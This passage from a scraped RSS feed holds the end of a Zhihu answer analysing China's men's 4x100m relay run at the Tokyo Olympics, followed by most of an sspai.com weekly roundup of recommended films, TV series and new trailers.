data-private-watermark-src=\"v2-e203a5710cd66aaa1765cae0c42d199f\"></p>\n<p><br></p>\n<p>比赛开始。</p>\n<p>汤星强0.153秒起跑反应，位列第5。从起跑到加速这一段相比其它选手没有什么优势（毕竟决赛第一道就没弱的），不过<b>在完成加速-进入最高速度时，维持极速相当不错。交接棒之前缩小了一些和洛伦佐（意大利）的差距</b>；</p>\n<p>第二棒给到谢震业后，小谢的过渡也是相当顺利的。而老对手日本队，可能过于兴奋/紧张，居然掉棒了……</p>\n<p>第三棒的苏炳添，自然是最强的 （<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" class=\"internal\">为什么苏炳添4*100米跑第三棒弯道？</a> ）。<b>苏炳添在英国队的外道，和同是老将的理查德·基尔蒂直接PK，死死咬住，几乎抹平了差距</b>；</p>\n<p>最后一棒吴智强是<b>惋惜后的惊喜</b>。</p>\n<p><b>吴智强的启动有点儿可惜，交接棒的启动节奏早了……甚至可能感觉出苏炳添的一丝懊恼。本来3-4棒交接这段，中国完全有可能追平英国、微超意大利。</b></p>\n<p><b>但这种可惜很快又变成一种惊喜，吴智强死死的压住了奥布利克·塞维尔（20岁的小将，百米尚未跑进10秒），将这种微弱领先保持住了。</b></p>\n<p><br></p>\n<p>意大利（菲利帕）和英国（米切尔·布莱克）的冲刺相当优秀，也决定了最终的名次。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><br></p>\n<p><b>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强有小失误不过后面全程力压牙买加——37秒79，追平国家纪录</b>（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是<b>决赛第四</b>——甚至跑赢了牙买加（0.05秒）！</p>\n<p>只落后铜牌加拿大0.09秒，加拿大的个体实力很高，交接棒技术只能算一般。而交接棒技术一直是世界最佳的日本和牙买加，今天却纷纷表现的非常业余。</p>\n<p><br></p>\n<p>中国队的表现，则真的相当出色。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d722048f4604475aef1050167d39e5bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-d722048f4604475aef1050167d39e5bc\" data-watermark-src=\"v2-7aeffd36c220ae50780d0d19b348b859\" data-private-watermark-src=\"v2-5753474e589fdf5b0db175f5aa766aa9\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-24b15adc47f6843c25336f7f79d3671f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-24b15adc47f6843c25336f7f79d3671f\" data-watermark-src=\"v2-49c4619611736d0b0343eaa0480c1741\" data-private-watermark-src=\"v2-d7b09e5140b397722702f5877c6bf862\"></p>\n<h2>\n<br>中国短跑接力队的昨天、今天和明天</h2>\n<p>太远古时期不提。<b>近年中国短跑和短跑接力兴起，也就是11、12年左右的事，正好十年前苏炳添、张培萌这一代起来。</b></p>\n<p>中国田径队前总教练冯树勇几年前说过一段话，大意是<b>中国接力队此前从上到下都“干劲不足”，大家抱着“人人弱则团体更弱”的心态。结果隔壁日本起了好榜样，4个百米都没破过十的选手，接力队却能和欧美扳手腕，于是从近邻身上得到信心，才有了后面几年可圈可点的成绩。</b></p>\n<p><br></p>\n<p>感兴趣可以看看这个回答，提到不少以前几支接力队：</p>\n<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-0d638eaf077707b53a0867e157bc41fd_bh.jpg\" data-image-width=\"2252\" data-image-height=\"836\" class=\"internal\">4x100米接力，为什么苏炳添会跑第三棒弯道？</a><p><br></p>\n<p>2016年，苏炳添接受采访时曾提到这样一句话，“<b>希望中国能多出几个百米跑到10秒20的年轻选手，这样中国接力队才能继续保持竞争力。</b>”当时铁打的最后一棒张培萌已近退役，苏炳添自己也快30。</p>\n<p>2015年北京世锦赛拿到银牌后，很多人就已经担心那支中国接力队已达到上限、很怕后继无人。</p>\n<p>然而这两年中国短跑很神奇的涌现出一大批很值得期待的年轻人。比如“00后”的<b>陈冠锋</b>（10秒06）、<b>何宇鸿</b>（10秒18）、<b>黄永炼</b>（10秒31）、<b>严海滨</b>（10秒22），以及禤达军、王智弘、陈程、李文杰……</p>\n<p><br></p>\n<p>其中比如严海滨，是2003年出生的小将，今年东京奥运会已经是接力队的替补了（这小伙100和200米都有很强竞争力）。还有今年屡次刷新个人最快的陈冠锋、去年刷新34年历史全国青年百米纪录的何宇鸿，<b>不少都已经比苏炳添们同龄时期表现的更为出色</b>。</p>\n<p>后生可畏。</p>\n<p>记住这些年轻的名字吧。</p>\n<p><b>兴许以他们的年龄和实力，在东京奥运会周期还无法挑大梁，不过明年的亚运会和世锦赛、包括三年后的巴黎奥运会，他们兴许就能慢慢接过苏炳添的旗帜。</b></p>\n<p>毕竟届时苏神已经35岁了。</p>\n<p>再加上梁劲生等依然还在当打年的“老将”（很可惜，今年4月底梁劲生拉伤，不然东京很有可能看到他），<b>中国接力队未来几年完全具备成为世界强队的可能。</b></p>\n<p><br></p>\n<p>至于这个上限是多少，比较现实的，</p>\n<ul>\n<li>稳定发挥确保进入决赛、赢下与老对手日本队「亚洲一哥」的较量、冲击前五甚至领奖台的名次；</li>\n<li>用交接棒的技术默契度弥补个体上的差异，用完善的青少年田径梯队人才去抗衡日本卡塔尔等存在的归化/混血军团（比如日本之前的萨尼·布朗）；</li>\n<li>也别像美国、特立尼达和多巴哥们一样，经常动不动交接棒环节拉胯、用低级失误白白浪费天赋；</li>\n</ul>\n<p><br></p>\n<p>另外最近20年，牙买加、美国、英国等接力强队都在药物问题上出现过问题，有隔了快十年成绩被作废、奖牌回收的黑历史——干干净净的跑，干干净净的赢。起码现在看，中国短跑国家队在这点上做得挺不错的。</p>\n<p><br></p>\n<p>继续加油，中国接力队！</p>\n<p>（通篇提的都是中国短跑接力男队，后面有时间再说说女队，同样是好样的）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-90a3e13851db76792d718804d9adee7f_720w.jpg?rss\" data-caption=\"最后一棒吴智强有遗憾有惊喜\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-90a3e13851db76792d718804d9adee7f\" data-watermark-src=\"v2-7d486b756e0ad33bd077e2037ebb5f47\" data-private-watermark-src=\"v2-c48799b733b3417771b12b432ba9b796\"></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">345 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476382083?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运田径女子组100米决赛？</a><br><a href=\"http://www.zhihu.com/question/476457735?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会女子 4x100 米混合泳接力决赛中国队获第 4 ？</a><br>\n","link":"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 7 部作品","date":"2021-08-06 10:11:59","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[电影] 怒火·重案、[纪录片] 柴米油盐之上、[动画] 异世界迷宫黑心企业、[电影] 智齿、[冰岛剧] 卡特拉火山、[综艺] 再见爱人、[韩剧] 远看是蔚蓝的春天</li>\n<li>几则精彩预告：漫威漫改超级英雄电影《毒液2》发新正式预告、《纸钞屋》第五季（最终季）正式中字预告片释出、热播日剧《女子警察的逆袭》原作宣布改编为 TV 动画、克林特·伊斯特伍德自导自演新片《哭泣的男人》预告、DC 漫改剧集《Y 染色体》9 月 13 日开播</li>\n<li>几则影视资讯：由罗素兄弟执导的豪华阵容动作惊悚片《灰人》宣布杀青、亚马逊剧版《指环王》发布剧照，定档：明年 9 月 2 日、《名侦探柯南 警察学校篇》将改编为 TV 动画、《数码宝贝》将推出新作 TV<strong> </strong>动画和动画电影</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[电影] 怒火·重案</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/ccdf0879283446d52a5698e6f4b2cec2\"></figure><p>关键词：动作 / 犯罪</p>\n<p>片长：128 分钟</p>\n<p>观看渠道：院线上映中；<a href=\"https://movie.douban.com/subject/30174085/\">豆瓣链接</a></p>\n<blockquote><p>黑白双雄，港风再来！</p></blockquote>\n<p>@潘誉晗：故事讲述重案组督察张崇邦是一个极具正义感的警察，也正是因为这份正义感让他受到了上司的阻挠，无法及时参与某次围剿毒枭的行动，但令人没有想到的是，这一次的行动是一个「黑吃黑」的阴谋，众多兄弟罹难让他悲痛万分，下定决心要抓住真凶的他没有想到，幕后组织这一切的竟是昔日的同侪邱刚敖。</p>\n<p>作为导演陈木胜的遗作，这是一部非常不错的动作片，也可以说是近几年在电影院里看到过的动作戏最扎实的港片。影片中那种拳拳到肉，刀刀见血，一言不合就掏枪的刺激感让我整个人肾上腺素飙升。甄子丹的动作戏毋庸置疑，好久没有新戏的谢霆锋也令人相当惊艳，仿佛是把这几年积累的能量一下子都爆发了，把一个因为觉得自己被背叛然后复仇的疯子形象演绎得非常到位。片中摩托车和小轿车的追逐戏特别精彩，最后半小时港片中常见的黑白双雄巅峰对决也是一点都不拖泥带水，所以并不会因为设定略微老套而觉得乏味，推荐有时间的小伙伴都去大荧幕感受一下。</p>\n<h3>[纪录片] 柴米油盐之上</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/0857bf2e11699a22c29704d873256679.png\"></figure><p>关键词：纪录片</p>\n<p>片长：35 分钟（单集）× 4 集；<a href=\"https://movie.douban.com/subject/35516588/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：本片导演是两届奥斯卡奖获得者、英国导演柯文思，片中，他将镜头对准平凡人物，忠实记录一个个追寻美好生活的普通中国人的故事，他们是中国变革故事的亲历者，也是创造者，他们靠自己的辛勤和智慧，改变了自己的生活，也参与到这场巨大的变革中来。</p>\n<p>虽然这是一部主旋律纪录片，但柯文思以相对中立的西方视角与饱含温度的镜头还原了普通中国百姓的故事——基层扶贫的开勇支书、坚强踏实的卡车司机琳宝、杂技明星王怀甫和快递行业的亿万富翁，既没有歌功颂德，也没有放大矛盾。导演试图去理解中国人难以离开故土和即使走出家乡后依旧怀有的眷恋，无论在何处打拼，故乡永远是每个中国人心里充满柔情的一隅，无论在何处生活，都牢牢记着养育自己的这一方水土，也有无数的人在有能力以后，力所能及地回馈自己的家乡，像常开勇回到基层，一边对家人充满愧疚，一边承担起为家乡摆脱贫困的艰巨任务；像琳宝，离开这个 6000 块卖掉她的地方，但仍记挂着父母儿子，努力打拼，期望将他们也接出来一起生活；像怀甫俨然已经摆脱贫困过上了小康生活，依旧带儿子回到家乡忆苦思甜，又如子胥村当年的砍柴少年们，在成为成功商人后回来反哺家乡。故事串联得像电影一样精彩，本片也向世界展现了可信、可敬、可爱的中国人！</p>\n<h3>[动画] 异世界迷宫黑心企业</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/e3ebb6f9ccf1042aab63656fce692273.png\"></figure><p>关键词：漫画改 / 剧情 / 奇幻 / 搞笑</p>\n<p>片长：24 分钟（单集）× 12 集，每周五更新</p>\n<p>观看渠道：<a href=\"https://www.amazon.co.jp/dp/B098WTK5RM/\">Amazon Prime Video</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234626/\">哔哩哔哩</a>（有删改）；<a href=\"https://movie.douban.com/subject/35128773/\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://magcomi.com/episode/10834108156766291310\">MAGCOMI</a> / <a href=\"https://manga.bilibili.com/detail/mc30007\">哔哩哔哩漫画</a>（有删改）</p>\n<blockquote><p>全异世界无产生物，联合起来！</p></blockquote>\n<p>@SHY：二之宫金治出生于现代日本，为对抗资本主义社会对人的异化，获取足够的生产资料后，便「躺平」家中，不事劳作。所谓天将降大任于斯人也，时代的洪流将他带到了异世界，此地正处于资本的原始积累阶段，工业革命改变了旧有的迷宫探索方式，巨型公司取代冒险者工会，在利益驱使下向更深处进发。沦落成其中一家企业底层「社畜」的二之宫，面对恶劣的工作环境、长时间的超负荷劳动与极其微薄的薪水，决定揭竿而起。他集结志同道合的伙伴，传授先进理念，打劳工权益牌，组织群众运动，为推翻黑心到家的公司，夺回愉快的家里蹲生活而奋斗。</p>\n<p>以上梗概绝无虚假，只有一点小问题：标题中的「迷宫黑心企业」是二之宫同志反抗组织的名字，他本人更是工贼代表，往上爬只为自己享福，却又在关键时刻闪烁着人性的光辉——然后加倍赚回来。在一水儿经不起考据的伪中世纪欧洲异世界中，原作称得上现实主义巨著，剖析并批判了职场中的常见陷阱，从公司养活员工、年轻就要打拼的毒鸡汤 PUA 话术到合同隐藏条款、不实广告宣传的具体商业决策，相信能引发不少观众共鸣。虽然改编动画的经费不怎么宽裕，但有原著打底，银链的发挥仍在水准线上，剧情删改详略得当，笑点密集又发人深省，从同类题材中脱颖而出。</p>\n<h3>[电影] 智齿</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/43e5d02b7d32deb8a65eb21c9bf22bd3\"></figure><p>关键词：悬疑 / 犯罪</p>\n<p>片长：118 分钟；<a href=\"https://movie.douban.com/subject/27124695/\">豆瓣链接</a></p>\n<blockquote><p>一部风非常格化、作者向的港片。</p></blockquote>\n<p>@甜約翰： 《智齿》改编自雷米的同名短篇小说，由郑保瑞执导，故事围绕一宗连环凶杀案展开。</p>\n<p>影片聚焦罪犯、吸毒者、援交女、拾荒者、非法移民等边缘人群展开叙事，杂糅了压抑、暴力、混乱、暗黑、血腥、失控等多种情绪，全片以黑白画面呈现，视觉风格和氛围营造一流，并呈现出一种「末世感」的电影气质。影片中关于「宿命论」的表达仿佛让我们又看到了那个以「黑」「狠」「冷」著称的银河映像。但是，影片的文本实在是有些弱，以致在叙事的流畅度上大打折扣。</p>\n<p>相较于中文片名《智齿》，英文片名《Limbo》或许更能体现影片的内核。《智齿》不仅让导演郑保瑞回归了自己擅长的犯罪题材类型片，其制作班底也相当豪华，叶伟信和黄柏高担任制片，编剧是欧健儿，美术设计是麦国强，都是银河映象的「老手」，此外，川井宪次的配乐也非常加分。演员方面，林家栋稳定输出，李淳虽然不出彩，但也不至于拉垮，倒是刘雅瑟的表现十分亮眼，值得一座影后奖杯。推荐这部电影给喜欢港片的朋友们。</p>\n<h3>[冰岛剧] 卡特拉火山</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/bcbbb86ae31884e97784da02742b1981\"></figure><p>关键词：剧情 / 科幻 / 悬疑</p>\n<p>片长：45 分钟（单集）× 8 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81133094\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34853059/\">豆瓣链接</a></p>\n<blockquote><p>卡特拉火山，是会吞食人类的。</p></blockquote>\n<p>@潘誉晗：这次网飞的新剧以现实中真实存在的冰岛火山卡特拉火山为线索，讲述在大爆发一年之后，火山附近的维克小镇发生了令人意想不到的诡异事件——那些曾经去世的人竟然一个一个都复活了！而当他们被发现的时候，身上总是被火山灰所覆盖。这到底是因为火山爆发所释放出的远古神秘元素在作祟，还是如当地的传说一样，是因为「卡特拉火山会吞食人类。」</p>\n<p>虽然这部新出的冰岛悬疑剧在国内的关注并不高，在豆瓣也只有不到四百人的评价，但在烂番茄，《卡特拉火山》不仅连续上榜「最受欢迎剧集」的榜单，而且也得到了 100% 的新鲜度。超自然现象的设定，缓缓道来的叙事方式，加上冰冷、神秘的叙事背景，都让人身临其境般地感受那个神秘的维克小镇。那些死而复生的人，被裹挟在黑色的躯壳下，洗净完毕露出干净的脸庞和清澈的双眼，看着一个个曾经熟悉的人一脸震惊，这一切的真相究竟是什么呢？</p>\n<h3>[综艺] 再见爱人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/e6be01a5cbedd686aa6b90513c8e349c\"></figure><p>关键词：爱情 / 真人秀</p>\n<p>片长：70 分钟（单集）× 13 集；<a href=\"https://movie.douban.com/subject/35438177/\">豆瓣链接</a></p>\n<blockquote><p>真实版《婚姻生活》。</p></blockquote>\n<p>@宇宙浪费指南：《再见爱人》是一部婚姻纪实观察类真人秀，在离婚冷静期推出之际，节目组选择了三对夫妻，他们是已离婚、正在离婚和想要离婚的夫妻，三对男女乘坐两辆房车，开启一段为期 18 天的旅行。再见爱人或许是 「再见👋 爱人」，又或许是「再，见爱人❤️」，开启一段已知的旅途，以及三个未知的结果。</p>\n<p>就像网友所说，这个综艺的最大受益者是观众，观众从旁观者的角度才能清晰地感知到很多问题，也在警告每个人「不要高估自己对没有爱情的婚姻生活的容忍程度」。单身的我，也一直在他们的故事里掉眼泪，也一直在反思自己。最令人难过的是，好像明明还彼此相爱，为什么就走到了离婚这一步？三对夫妻充满了中年的疲惫与妥协，被生活打磨过的他们步调不再一致，关注点也再不相同，对彼此的热爱和想象都在鸡毛蒜皮的生活里消失殆尽。</p>\n<p>节目中的他们鼓起勇气，想要为自己的感情再试一次，他们无比真实，尽数展示自己的狼狈、逞强，然后礼貌体面地离场。它让我一个从未有过婚姻经历的人感慨，原来打败婚姻的或许不止是消失的爱，也让我明白：结婚不一定出于爱，但离婚一定是为了幸福。</p>\n<h3>[韩剧] 远看是蔚蓝的春天</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/521714ed3709d2707ff48cb6b110a337.png\"></figure><p>关键词：剧情 / 青春</p>\n<p>片长：62 分钟（单集）× 12 集；<a href=\"https://movie.douban.com/subject/26954774/\">豆瓣链接</a></p>\n<blockquote><p>春天是——从远处看才是蔚蓝色的。</p></blockquote>\n<p>@潘誉晗：本剧改编自同名漫画，围绕正青春的大学展开，但其实每个人的心中都有着自己隐藏着的伤痛。看上去没有缺点的男主角大概是最完美的大一新生，即使面对学长们的无理要求，他都可以笑眯眯地掏出钱来，原来，习惯用钱来维持友谊的他因为家庭暴力的原因在不知不觉中成长为一个讨好型人格的人。父母离婚带来的影响再加上学校园暴力，则让女主开始恐惧和别人的交往。</p>\n<p>虽然本剧的整体风格有点类似青春疼痛文学，但是看完之后，心疼之余还会觉得治愈，而没有那种为了伤痛而虐的矫情感。剧集对于原生家庭的话题探讨拓宽了本剧的深度，主角们的演技也为整部剧集增加了不少的亮点。年轻演员们清新又自然的演技非常符合人物设定，而且这样不做作的演绎方式也为观众们呈现了一出很棒的青春群像戏。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35155170/\">[美剧] 外滩探秘 第二季</a> @潘誉晗：作为去年全球十大热搜剧，《外滩探秘》还是让不少观众期待第二季的。度假胜地因一场摧毁了电力系统的飓风发生了改变，夏天、友谊、四亿美金、寻找失踪的父亲，原以为是关于青少年成长的剧却变成了一场外滩群岛上的冒险之旅。青春的少男少女，热带风情的海岛，似乎带有某种征兆的海浪，很适合夏季开胃调剂。</p>\n<p><a href=\"https://movie.douban.com/subject/35410438/\">[动画] 迦希大人不气馁！</a> @SHY：身为魔界 No.2 的迦希大人，今天也享受着肆意妄为的美好生活——本该是这样的。然而，可恶的魔法少女夺走了一切，迦希大人也沦落人间，过上三餐只有豆芽菜的悲惨生活。即使如此也 <a href=\"https://cdn.sspai.com/2021/08/06/a6b6f68dc611b60d3cd3c92c9f4a8b81.png\">绝不会气馁</a>，为了复兴魔界而每日努力！本季度银链 × 凑未来的另一部，日常喜剧样板戏，制作较为贫穷，但表情包大家都见过，不信请点击前方链接，然后参见上一句。</p>\n<p><a href=\"https://movie.douban.com/subject/35467021/\">[日剧] 她很漂亮</a> @潘誉晗：曾经的小胖墩变成优秀帅哥回国，想再一次见到自己的青梅竹马，只是当年那个漂亮风光的女生已经变得平凡甚至普通。作为大热 IP 的翻拍，本剧在剧情上并没有太多创新，但印证了同一个道理：判断一个人漂亮与否不能完全靠脸，而正确的那个人是不会以貌取人的。</p>\n<h3>吐槽区</h3>\n<p><a href=\"https://movie.douban.com/subject/34905959/\" target=\"_blank\">[国产剧] 一宅家族</a> @宇宙浪费指南：情景喜剧爱好者看到有接班人出现，简直狂喜，但不出一集就令我彻底失望，或许现在的编剧并不懂小品和情景喜剧的区别吧，剧本很小品，演员演得也很小品，整部剧没有笑点，很多台词都是网络段子大杂烩，靠台词强行搞笑，既浮夸又尴尬，人设老套，矛盾点很生硬，甚至不是一部合格的小品作品。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫威漫改超级英雄电影《毒液2》发新正式预告</h3> <p>8 月 2 日，由安迪·瑟金斯执导的《毒液2》发布全新预告，汤姆·哈迪回归扮演毒液，伍迪·哈里森扮演屠杀，娜奥米·哈里斯扮演反派尖叫，影片将于 9 月 16 日起全球献映，北美上映时间为 9 月 24 日，内地档期待定。</p>\n<h3>《纸钞屋》第五季（最终季）正式中字预告片释出</h3> <p>8 月 3 日，Netflix 西班牙剧集《纸钞屋》发布预告，本片由乌苏拉·科尔维罗 / 阿尔瓦罗·莫奇 / 米格尔·安赫尔·西尔维斯特 / 帕特里克·克里亚多主演，上部将由 9 月 3 日播出，下部 12 月 3 日播出。</p>\n<h3>热播日剧《<strong>女子警察的逆袭》原作宣布改编为</strong> TV 动画</h3> <p>8 月 1 日，泰三子的漫画《秘密内幕 ~女警的反击~》宣布将改编为 TV 动画，佐藤雄三执导，金月龙之介系构，土屋圭人设，若山诗音、石川由依担任主役声优，MADHOUSE 制作，2022 年开始播出。本作主要讲述新人巡警川合麻衣与前辈警官藤圣子的日常工作物语，同名日剧正在热播中。</p>\n<h3>克林特·伊斯特伍德自导自演新片《哭泣的男人》预告</h3> <p>90 岁的克林特·伊斯特伍德自导自演的西部片《哭泣的男人》发布中字版正式预告。该片将于 9 月 17 日同步登陆北美院线及 HBO Max。</p>\n<h3>DC 漫改剧集《Y 染色体》9 月 13 日开播</h3> <p>8 月 6 日，改编自 DC 同名漫画，本·施耐泽、戴安·琳恩、伊莫琴·普茨、马琳·爱尔兰主演的剧集《Y 染色体》发布正式预告。第一季共 10 集，将于 9 月 13 日 FX 和 Hulu 同时开播。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1KA411P7Fs?from=search&amp;seid=10092566067795351406\" target=\"_blank\"><strong>Amazon 原创新《灰姑娘》真人电影：</strong></a>由卡米拉·卡贝洛饰灰姑娘，尼古拉斯·加利齐纳扮演罗伯特王子、「艾莎」伊迪娜·门泽尔扮演后妈、皮尔斯·布鲁斯南扮演罗伯特王子的父亲国王以及比利·波特扮演仙女教母的《灰姑娘》将于 9 月 3 日在亚马逊流媒体上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1o341167rR?from=search&amp;seid=18335345258211662781\" target=\"_blank\"><strong>日版翻拍惊悚科幻电影《心慌方/异次元杀阵》：</strong></a>由菅田将晖、杏、冈田将生、田代辉、斋藤工、吉田钢太郎主演的日版《心慌方/异次元杀阵》发布正式预告，今年 10 月 22 日在日本率先上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pU4y1J72a?from=search&amp;seid=12409605323873835636\" target=\"_blank\"><strong>《美国犯罪故事：弹劾》发布正式预告：</strong></a>《美国犯罪故事》第三季发布正式预告，该剧改编自杰弗里·图宾书籍《巨大的阴谋：几乎使总统下台的性丑闻》，将重现上世纪末著美国政坛著名丑闻——克林顿与莱温斯基的「拉链门」。本剧共 10 集，将于 9 月 7 日播出。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1G64y1s7V9?from=search&amp;seid=7938038693596926993\" target=\"_blank\"><strong>Apple TV+ 音乐剧《来自远方》的电影版发布先导预告：</strong></a>著名百老汇音乐剧《来自远方》的电影版定档：今年 9 月 10 日上线 Apple TV+，并发布先导预告。本片由剧版导演克里斯托弗·阿什利继续执导，原卡司回归主演，5 月在纽约的杰拉尔德·肖恩菲尔德剧院录制。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1uv411J7xS?from=search&amp;seid=3904344468513124789\" target=\"_blank\"><strong>詹姆斯·麦卡沃伊主演新片《在一起》发布正式预告：</strong></a>由史蒂芬·戴德利执导，詹姆斯·麦卡沃伊、莎朗·豪根主演的电影《在一起》发布正式预告。该片聚焦疫情期间的婚姻故事，将于 8 月 27 日北美上映。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>由罗素兄弟执导的豪华阵容动作惊悚片《灰人》宣布杀青</h3>\n<p>本片由安东尼·罗素、乔·罗素执导，改编自马克·格里尼 2009 